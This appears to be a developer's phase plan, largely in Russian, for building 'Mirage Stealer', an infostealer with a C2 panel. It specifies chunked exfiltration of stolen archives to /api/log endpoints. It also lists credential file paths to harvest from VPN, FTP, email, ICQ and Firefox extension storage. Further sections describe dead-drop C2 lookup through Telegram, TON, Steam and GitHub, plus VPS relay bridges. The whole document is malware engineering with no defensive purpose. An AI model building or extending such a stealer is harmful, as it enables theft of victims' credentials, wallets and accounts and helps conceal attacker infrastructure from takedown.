# Phase 13: Mirage Stealer — Infrastructure Implementation Plan

**Цель:** Chunked upload, VPN/FTP/Email clients, ICQ, Firefox extensions, redirect proxies, firewall/anti-flood.
**Всего задач:** 22 | **Оценка:** ~6 дней | **Сложность:** Средняя

---

## Dependency Map

```
13.1 Chunked Upload (сеть)
  ├─ Network: panel_http.zig модификация
  ├─ Panel: ServerSideDecryptor.cs расширение
  └─ Независим от остального

13.2 VPN/FTP/Email (файловая система)
  ├─ Копирование конфигов по путям (file_io.zig + std.fs)
  └─ Независим

13.3 ICQ (файловая система)
  ├─ Копирование %APPDATA%\ICQ\0001\
  └─ Независим

13.4 Firefox Extensions (файловая система)
  ├─ Копирование storage\default\moz-extension-*\
  └─ Независим

13.5 Redirect Proxies (сеть)
  ├─ network: HTTP GET → парсинг C2 из публичных источников
  ├─ Panel: Bridge management UI
  └─ Независим

13.6 Firewall/Anti-Flood (Panel, C#)
  ├─ PanelServer.cs модификация
  └─ Независим
```

---

## 13.1 Chunked Upload (6 задач, ~1.5 дня)

### Что делаем
Вместо отправки всего архива одним POST — отправка чанками по 1 MB. Если соединение прервётся, часть данных уже на сервере.

### Референсы в raw/
- `CloudStealer-v1\Templates\Stub\C2\C2Sender.cs.tmpl` — 64KB TCP chunked upload
- `CloudStealer-v1\Templates\Server\Program.cs.tmpl` — server-side receive
- `ferrox\src\communications\telegram.rs` — 45MB Telegram chunked upload

### Алгоритм
```
1. Сгенерировать session_id (случайный UUID)
2. Разделить archive_data на чанки по CHUNK_SIZE (1 MB)
3. Для каждого чанка:
   POST /api/log/chunk
     session_id={session_id}
     chunk_index={N}
     data={chunk_bytes}
   Если 3 попытки не удались → abort
4. POST /api/log/complete
     session_id={session_id}
     total_chunks={N}
     metadata={...}
5. Сервер: собрать чанки → проверить целостность → сохранить
```

### Файлы для создания/модификации
| Файл | Действие |
|------|----------|
| `src/network/chunked.zig` | 🆕 Новый |
| `src/network/panel_http.zig` | ✏️ Добавить вызов chunked отправки |
| `Mirage.Panel/Services/PanelServer.cs` | ✏️ Добавить /api/log/chunk, /api/log/complete |

### chunked.zig structure
```zig
const std = @import("std");
const http = @import("http.zig");
const hash = @import("../types/hash.zig");

pub const ChunkResult = enum(u32) {
    complete = 0,
    partial = 1,
    failed = 2,
};

const CHUNK_SIZE: usize = 1024 * 1024; // 1 MB
const MAX_RETRIES: u32 = 3;

pub fn uploadChunked(
    allocator: std.mem.Allocator,
    c2_host: []const u8,
    c2_port: u16,
    token: []const u8,
    data: []const u8,
    metadata: []const u8,
) ChunkResult { ... }
```

### PanelServer.cs endpoints
```csharp
// Промежуточное хранилище чанков в temp
private static readonly ConcurrentDictionary<string, ChunkedSession> _chunks = new();

app.MapPost("/api/log/chunk", async (HttpRequest req) => {
    // Читаем session_id, chunk_index, data
    // Сохраняем чанк: _chunks[session_id].chunks[chunk_index] = data
    // Отвечаем OK
});

app.MapPost("/api/log/complete", async (HttpRequest req) => {
    // Собираем все чанки по session_id
    // Проверяем целостность (total_chunks == chunks.Count)
    // Собираем полный архив
    // Вызываем существующий LogProcessor.Process()
});
```

### Тесты
- Отправка 0 байт → complete с 0 чанками
- Отправка <1 MB → 1 чанк
- Отправка 3.5 MB → 4 чанка
- Ошибка соединения → retry 3 раза → failed

---

## 13.2 VPN / FTP / Email Clients (3 подзадачи, ~2 дня)

### Общий подход
Каждый клиент = набор путей + файлов для копирования. Копирование через `file_io.zig` или `std.fs`. Никакой расшифровки — просто сбор файлов. Расшифровка (где нужно, как DPAPI в NordVPN) делается на сервере.

### 13.2.1 VPN Clients (`src/vpn/vpn.zig`)

**Референсы:** SentinelStealer VPN/*.cs, PhantomStealer NordVpn.cs/OpenVpn.cs/ProtonVpn.cs, ferrox crypto_keys.rs

| VPN | Путь | Файлы |
|-----|------|-------|
| NordVPN | `%LOCALAPPDATA%\NordVPN` | `nordvpn.db`, `credentials.json`, `user.config` |
| OpenVPN | `%APPDATA%\OpenVPN Connect\profiles\` | `*.ovpn` |
| ProtonVPN | `%LOCALAPPDATA%\ProtonVPN\ProtonVPN.exe*\version\` | `user.config` |
| ExpressVPN | `%APPDATA%\ExpressVPN` | Вся директория |
| Surfshark | `%APPDATA%\Surfshark` | `*.dat` |
| CyberGhost | `%APPDATA%\CyberGhost` | Вся директория |
| PIA | `%APPDATA%\Private Internet Access` | Вся директория |
| Windscribe | `%LOCALAPPDATA%\Windscribe` | `*.json`, `*.dat`, `*.config` |
| TunnelBear | `%APPDATA%\TunnelBear` | Вся директория |
| Hotspot Shield | `%LOCALAPPDATA%\HotspotShield` | Вся директория |
| VyprVPN | `%APPDATA%\VyprVPN` | Вся директория |
| WireGuard | `%APPDATA%\WireGuard\Configurations\` | `*.conf` (содержит PrivateKey) |
| Mullvad | `%LOCALAPPDATA%\Mullvad VPN` | `account-history.json` |

### 13.2.2 FTP Clients (`src/ftp/ftp.zig`)

**Референсы:** SentinelStealer FTP/*.cs, Stealerium FileZilla.cs

| FTP | Путь | Файлы |
|-----|------|-------|
| FileZilla | `%APPDATA%\FileZilla\` | `recentservers.xml`, `sitemanager.xml` |
| WinSCP | `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions\*` | Registry + `WinSCP.ini` |
| Total Commander | `%APPDATA%\GHISLER\` | `*.ini`, `*.txt` |
| Far Manager | `%APPDATA%\Far Manager\` | `*.ini`, `*.reg` |
| CuteFTP | `%APPDATA%\Globalscape\CuteFTP\` | `*.dat`, `*.xml` |
| SmartFTP | `%APPDATA%\SmartFTP\Client 2.0\Favorites\` | Все файлы |
| FlashFXP | `%APPDATA%\FlashFXP\` | `*.dat`, `*.xml` |
| CoreFTP | `HKCU\SOFTWARE\FTPWare\COREFTP\Sites\*` | Registry |

### 13.2.3 Email Clients (`src/email/email.zig`)

**Референсы:** SentinelStealer Mail/*.cs, Stealerium Outlook.cs

| Email | Путь | Файлы |
|-------|------|-------|
| Outlook | Registry + `%LOCALAPPDATA%\Microsoft\IdentityCache\` | Bin файлы + registry |
| Thunderbird | `%APPDATA%\Thunderbird\Profiles\*\` | `logins.json`, `key4.db`, `cert9.db` |
| Foxmail | Registry → install path | `Storage\*\Accounts\*` |
| eM Client | `%APPDATA%\eM Client\` | `*.dat`, `*.db` |
| Windows Mail | `%LOCALAPPDATA%\Comms\` | `*.json` |
| Mailbird | `%LOCALAPPDATA%\Mailbird\Store\` | `*.db` |

### Файлы
| Файл | Действие |
|------|----------|
| `src/vpn/vpn.zig` | 🆕 Новый |
| `src/ftp/ftp.zig` | 🆕 Новый |
| `src/email/email.zig` | 🆕 Новый |
| `src/system/system_info.zig` | ✏️ Добавить вызовы vpn/ftp/email |

---

## 13.3 ICQ Messenger (1 задача, ~0.5 дня)

### Референсы
- `PhantomStealer\Phantom.Stub.Target.Messengers\Icq.cs` — копирование `%APPDATA%\ICQ\0001\`
- `Stealerium\Stub\Target\Messengers\Icq.cs` — 30 строк
- `ferrox\src\app\messaging.rs` — строки 132-140

### Алгоритм
```
1. Проверить %APPDATA%\ICQ\0001\
2. Если существует → скопировать всю директорию
3. Включить все *.db, *.sqlite, *.dat файлы
```

### Файлы
| Файл | Действие |
|------|----------|
| `src/messengers/icq.zig` | 🆕 Новый |
| `src/messengers/messengers.zig` | ✏️ Добавить icq.collect() |

---

## 13.4 Firefox Extensions (1 задача, ~1 день)

### Проблема
Firefox хранит расширения НЕ как Chromium. Нет `Local Extension Settings` с LevelDB. Вместо этого:
- XPI файлы: `%APPDATA%\Mozilla\Firefox\Profiles\{profile}\extensions\{id}.xpi`
- IndexedDB: `%APPDATA%\Mozilla\Firefox\Profiles\{profile}\storage\default\moz-extension-{uuid}\idb\*.sqlite`
- Local Storage: `%APPDATA%\Mozilla\Firefox\Profiles\{profile}\storage\default\moz-extension-{uuid}\ls\data.sqlite`

### Референсы
- `CloudStealer-v1\Templates\Stub\Grabbers\Browsers.cs.tmpl` — строки 311-342
- `Stealerium\Stub\Target\Browsers\Chromium\Extensions.cs` — Chrome только
- `thebear\src\ExtensionsGrabber.c` — Chrome только (LevelDB)

### Алгоритм
```
1. Для каждого Firefox профиля:
2.   storage\default\moz-extension-{uuid}\ — скопировать всю директорию
3.   extensions\{id}.xpi — скопировать все XPI файлы
```

### Файлы
| Файл | Действие |
|------|----------|
| `src/browsers/firefox_extensions.zig` | 🆕 Новый |
| `src/browsers/firefox.zig` | ✏️ Добавить вызов firefox_extensions |

---

## 13.5 Redirect Proxies (Bridges) (7 задач, ~1.5 дня)

### Что делаем
Вместо хардкода C2 в бинарнике — динамическое получение C2 из публичных источников. Билд не содержит IP адреса панели.

### Уровни

**Level 1 — Telegram пост (аналог VoltaStealer):**
```
1. HTTP GET t.me/{channel}/{post_id}
2. Парсить HTML страницы на наличие ссылки/текста
3. Извлечь C2 URL из содержимого поста
4. Закешировать (чтобы не дёргать часто)
```

**Level 1 — TON транзакция (аналог VoltaStealer):**
```
1. HTTP GET tonapi.io/v2/blockchain/accounts/{address}/transactions
2. В поле comment/storage текст транзакции → C2 URL
```

**Level 1 — Steam профиль (аналог VoltaStealer):**
```
1. HTTP GET steamcommunity.com/id/{profile}
2. Парсить раздел "info" или "summary"
3. Извлечь C2 URL
```

**Level 2 — GitHub Releases (аналог Open Source):**
```
1. HTTP GET api.github.com/repos/{user}/{repo}/releases/latest
2. В description релиза → C2 URL
```

**Level 3 — VPS Bridge (аналог STORM Bridges):**
```
1. Пользователь указывает SSH данные VPS в панели
2. Система автоматически настраивает nginx reverse proxy
3. Все запросы от билдов идут через VPS → основная панель
```

### Референсы
- `thebear\src\SendData.c` — низкоуровневая HTTP отправка
- `ferrox\src\communications\telegram.rs` — Telegram как канал связи

### Файлы
| Файл | Действие |
|------|----------|
| `src/network/proxy.zig` | 🆕 Новый |
| `src/config/config.zig` | ✏️ Добавить C2_PROXY_ENABLED, C2_CHANNEL |
| `Mirage.Panel/Services/PanelServer.cs` | ✏️ Добавить Bridge management UI |

---

## 13.6 Firewall / Anti-Flood (Panel) (4 задачи, ~0.5 дня)

### Референсы
- `CloudStealer-v1\Templates\Server\Program.cs.tmpl` — rate limiting + brute-force

### Что реализовать

**IP-based rate limiting:**
```csharp
// 60 req/min per IP (уже есть базовый в PanelServer.cs)
// Улучшить: сделать конфигурируемым, добавить burst
```

**Bot detection:**
```csharp
// Проверка User-Agent: если не похож на реальный браузер → подозрительно
// Проверка Content-Type: не multipart → не наш билд
// Проверка частоты запросов с одного IP
```

**Brute-force protection:**
```csharp
// После 10 неудачных попыток аутентификации → вечный бан IP
```

**Auto-ban list:**
```csharp
// Таблица Bans (HWID, IP, причина, время начала, длительность)
// Автоматическая блокировка при подозрительной активности
// Время бана настраивается в конфиге (по умолчанию 24 часа)
```

**Референсы:** CloudStealer-v1 Server Program.cs.tmpl

### Файлы
| Файл | Действие |
|------|----------|
| `Mirage.Panel/Services/PanelServer.cs` | ✏️ Улучшить rate limiting |
| `Mirage.Panel/Data/AppDbContext.cs` | ✏️ Добавить Ban table |

---

## Execution Order

```
Day 1: Chunked Upload (stealer + panel)
  ├─ chunked.zig — splitting + retry + session management
  ├─ panel_http.zig — выбор: chunked или обычная отправка
  └─ PanelServer.cs — /api/log/chunk + /api/log/complete

Day 2: VPN Clients
  ├─ vpn.zig — 13 VPN клиентов, копирование конфигов
  └─ system_info.zig — интеграция

Day 3: FTP + Email Clients
  ├─ ftp.zig — 8 FTP клиентов
  ├─ email.zig — 6 email клиентов
  └─ system_info.zig — интеграция

Day 4: ICQ + Firefox Extensions
  ├─ icq.zig — сбор ICQ данных
  ├─ firefox_extensions.zig — Firefox wallet/2FA storage
  └─ messengers.zig + firefox.zig — интеграция

Day 5: Redirect Proxies (Level 1-2)
  ├─ proxy.zig — Telegram/TON/Steam/GitHub парсинг
  └─ config.zig — C2_CHANNEL флаг

Day 6: Anti-Flood + Bridges UI
  ├─ PanelServer.cs — improved rate limiting + bot detection + brute-force
  ├─ AppDbContext.cs — Ban table
  ├─ PanelServer.cs — Bridge management UI
  └─ proxy.zig — Level 3: VPS Bridge SSH setup
```

## Files Summary

### Новые файлы (7):
| File | SLOC | Референс в raw/ |
|------|------|-----------------|
| `src/network/chunked.zig` | ~100 | CloudStealer-v1 C2Sender.cs.tmpl |
| `src/vpn/vpn.zig` | ~150 | SentinelStealer VPN/*.cs |
| `src/ftp/ftp.zig` | ~120 | SentinelStealer FTP/*.cs |
| `src/email/email.zig` | ~120 | SentinelStealer Mail/*.cs |
| `src/messengers/icq.zig` | ~30 | PhantomStealer Icq.cs, ferrox messaging.rs |
| `src/browsers/firefox_extensions.zig` | ~60 | Stealerium Extensions.cs |
| `src/network/proxy.zig` | ~200 | thebear SendData.c, ferrox telegram.rs |

### Модифицируемые файлы (7):
| File | Изменения |
|------|-----------|
| `src/network/panel_http.zig` | +Chunked upload path |
| `src/config/config.zig` | +C2_PROXY_ENABLED, +C2_CHANNEL |
| `src/system/system_info.zig` | +vpn/ftp/email collectors |
| `src/messengers/messengers.zig` | +icq.collect() |
| `src/browsers/firefox.zig` | +firefox_extensions.collect() |
| `Mirage.Panel/Services/PanelServer.cs` | +chunk endpoints, +bridge UI, +anti-flood |
| `Mirage.Panel/Data/AppDbContext.cs` | +Bans table |
